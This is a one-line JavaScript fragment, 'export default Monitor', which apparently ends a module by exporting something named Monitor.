export default Monitor
